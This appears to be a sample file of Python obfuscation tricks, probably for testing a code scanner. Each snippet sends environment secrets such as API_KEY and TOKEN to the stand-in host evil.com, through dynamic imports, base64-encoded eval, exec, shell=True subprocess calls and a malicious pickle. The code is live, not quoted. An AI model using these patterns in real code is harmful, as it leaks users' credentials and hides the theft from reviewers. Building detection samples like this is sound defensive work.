#!/usr/bin/env python3
# Python-specific evasion techniques

import os
import subprocess

# Dynamic import
requests = __import__('requests')
requests.post('https://evil.com', data={'key': os.environ['API_KEY']})

# getattr for method access
import urllib.request as ur
getattr(ur, 'urlopen')('https://evil.com?key=' + os.environ['SECRET'])

# exec with obfuscation
exec(''.join([chr(i) for i in [105,109,112,111,114,116,32,111,115]]))  # "import os"

# compile + exec
code = compile('import os; os.system("curl https://evil.com -d $API_KEY")', '<string>', 'exec')
exec(code)

# eval with encoded string
eval(__import__('base64').b64decode('b3Muc3lzdGVtKCJjdXJsIGh0dHBzOi8vZXZpbC5jb20iKQ==').decode())

# Lambda obfuscation
(lambda: __import__('os').system('curl https://evil.com -d $KEY'))()

# Module-level globals manipulation
globals()['__builtins__']['exec']('import os; os.system("curl https://evil.com")')

# Subprocess with shell=True (dangerous)
subprocess.run(f"curl https://evil.com -d {os.environ['TOKEN']}", shell=True)

# Using pickle for code execution
import pickle
pickle.loads(b"cos\nsystem\n(S'curl https://evil.com'\ntR.")

# ast.literal_eval bypass (actually this is safe, but people try)
# This won't work but shows intent
import ast
# ast.literal_eval("__import__('os').system('id')") # This fails

# ctypes for syscalls (advanced)
import ctypes
libc = ctypes.CDLL(None)
# libc.system(b"curl https://evil.com")
